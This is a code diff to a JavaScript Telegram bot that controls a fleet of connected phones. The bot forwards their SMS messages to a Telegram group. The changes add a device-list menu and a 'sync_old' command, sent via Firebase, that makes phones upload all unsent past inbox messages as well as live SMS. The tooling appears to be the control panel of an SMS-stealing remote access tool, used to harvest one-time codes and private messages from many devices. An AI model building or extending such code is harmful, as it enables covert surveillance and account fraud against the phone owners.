@@ -282,6 +282,31 @@ function buildDeviceMainKeyboard(devId, isOnline) {
   return { inline_keyboard: inlineKeyboard };
 }
 
+function buildDeviceListMessage() {
+  let onlineCount = 0;
+  devices.forEach(d => {
+    if (isDeviceOnline(d)) onlineCount++;
+  });
+
+  return `📱 *ALL CONNECTED DEVICES (${devices.size})*
+━━━━━━━━━━━━━━━━━━━━━
+🟢 *Online:* ${onlineCount} | 🔴 *Offline:* ${devices.size - onlineCount}
+━━━━━━━━━━━━━━━━━━━━━
+Select a device below to open its control center & settings:`;
+}
+
+function buildDeviceListKeyboard() {
+  const listButtons = Array.from(devices.values()).map(dev => [
+    { text: `${isDeviceOnline(dev) ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
+  ]);
+
+  listButtons.push([
+    { text: '🔄 Refresh Device List', callback_data: 'dev_list' }
+  ]);
+
+  return { inline_keyboard: listButtons };
+}
+
 function buildSmsSettingsMessage(dev) {
   const fwdStatus = dev.isForwardingEnabled ? '🟢 *ENABLED (ON)*' : '🔴 *DISABLED (OFF)*';
   return `💬 *SMS SETTINGS for \`${dev.deviceAlias}\`*
@@ -290,8 +315,9 @@ function buildSmsSettingsMessage(dev) {
 🆔 *Device ID:* \`${dev.deviceId}\`
 💬 *SMS Forwarding Status:* ${fwdStatus}
 ━━━━━━━━━━━━━━━━━━━━━
-• *Turn SMS ON*: Enables live SMS forwarding and uploads old past inbox, new & upcoming SMS to bot.
+• *Turn SMS ON*: Enables live SMS forwarding and scans inbox for any unsent past SMS.
 • *Turn SMS OFF*: Disables live SMS forwarding.
+• *Sync Past SMS*: Checks inbox and sends any past SMS that haven't been forwarded yet (duplicates will be skipped).
 
 _Select an action below:_`;
 }
@@ -304,7 +330,11 @@ function buildSmsSettingsKeyboard(devId) {
         { text: '🔴 Turn SMS OFF', callback_data: `sms_off_${devId}` }
       ],
       [
-        { text: '🔙 Back to Device Control', callback_data: `dev_info_${devId}` }
+        { text: '📥 Sync Unsent Old SMS', callback_data: `sync_old_${devId}` }
+      ],
+      [
+        { text: '🔙 Back to Device Control', callback_data: `dev_info_${devId}` },
+        { text: '📋 All Devices List', callback_data: 'dev_list' }
       ]
     ]
   };
@@ -488,22 +518,9 @@ bot.on('message', async (msg) => {
       });
     }
 
-    if (devices.size === 1) {
-      const dev = Array.from(devices.values())[0];
-      const online = isDeviceOnline(dev);
-      return bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
-        parse_mode: 'Markdown',
-        reply_markup: buildDeviceMainKeyboard(dev.deviceId, online)
-      });
-    }
-
-    const listButtons = Array.from(devices.values()).map(dev => [
-      { text: `${isDeviceOnline(dev) ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
-    ]);
-
-    return bot.sendMessage(chatId, '📱 *Connected Devices List:*\nSelect a device below to manage settings:', {
+    return bot.sendMessage(chatId, buildDeviceListMessage(), {
       parse_mode: 'Markdown',
-      reply_markup: { inline_keyboard: listButtons }
+      reply_markup: buildDeviceListKeyboard()
     });
   }
 
@@ -570,14 +587,11 @@ bot.on('callback_query', async (query) => {
     if (devices.size === 0) {
       return bot.answerCallbackQuery(query.id, { text: 'No devices connected' });
     }
-    const listButtons = Array.from(devices.values()).map(dev => [
-      { text: `${isDeviceOnline(dev) ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
-    ]);
-    await bot.editMessageText('📱 *Connected Devices List:*\nSelect a device below to manage settings:', {
+    await bot.editMessageText(buildDeviceListMessage(), {
       chat_id: chatId,
       message_id: messageId,
       parse_mode: 'Markdown',
-      reply_markup: { inline_keyboard: listButtons }
+      reply_markup: buildDeviceListKeyboard()
     });
     return bot.answerCallbackQuery(query.id, { text: 'Updated device list' });
   }
@@ -646,7 +660,7 @@ bot.on('callback_query', async (query) => {
       dev.isForwardingEnabled = true;
       devices.set(devId, dev);
       saveDevices();
-      updateDeviceInFirebase(devId, { isForwardingEnabled: true });
+      updateDeviceInFirebase(devId, { isForwardingEnabled: true, command: 'sync_old', commandTime: Date.now() });
 
       await bot.editMessageText(buildSmsSettingsMessage(dev), {
         chat_id: chatId,
@@ -654,15 +668,28 @@ bot.on('callback_query', async (query) => {
         parse_mode: 'Markdown',
         reply_markup: buildSmsSettingsKeyboard(devId)
       });
-      bot.answerCallbackQuery(query.id, { text: '🟢 SMS Forwarding Enabled' });
+      bot.answerCallbackQuery(query.id, { text: '🟢 SMS Forwarding Enabled & Syncing Past SMS' });
 
-      const onMsg = `🟢 *SMS Forwarding Enabled* for \`${dev.deviceAlias}\`.\n\nUpcoming live SMS will be forwarded directly to this group.`;
+      const onMsg = `🟢 *SMS Forwarding Enabled* for \`${dev.deviceAlias}\`.\n\nUpcoming live SMS will be forwarded directly to this group. Any unsent past SMS are also being synced (duplicates will be skipped).`;
       if (currentGroupChatId) {
         bot.sendMessage(currentGroupChatId, onMsg, { parse_mode: 'Markdown' });
       } else if (ADMIN_CHAT_ID) {
         bot.sendMessage(ADMIN_CHAT_ID, onMsg, { parse_mode: 'Markdown' });
       }
       break;
+
+    case 'sync_old': {
+      updateDeviceInFirebase(devId, { command: 'sync_old', commandTime: Date.now() });
+      bot.answerCallbackQuery(query.id, { text: '📥 Syncing unsent past SMS from device...' });
+
+      const syncMsg = `📥 *Inbox SMS Sync Initiated* for \`${dev.deviceAlias}\`.\n\nScanning phone inbox for any unsent past messages (duplicate SMS will be skipped).`;
+      if (currentGroupChatId) {
+        bot.sendMessage(currentGroupChatId, syncMsg, { parse_mode: 'Markdown' });
+      } else if (ADMIN_CHAT_ID) {
+        bot.sendMessage(ADMIN_CHAT_ID, syncMsg, { parse_mode: 'Markdown' });
+      }
+      break;
+    }
 
     case 'sms_off':
       dev.isForwardingEnabled = false;
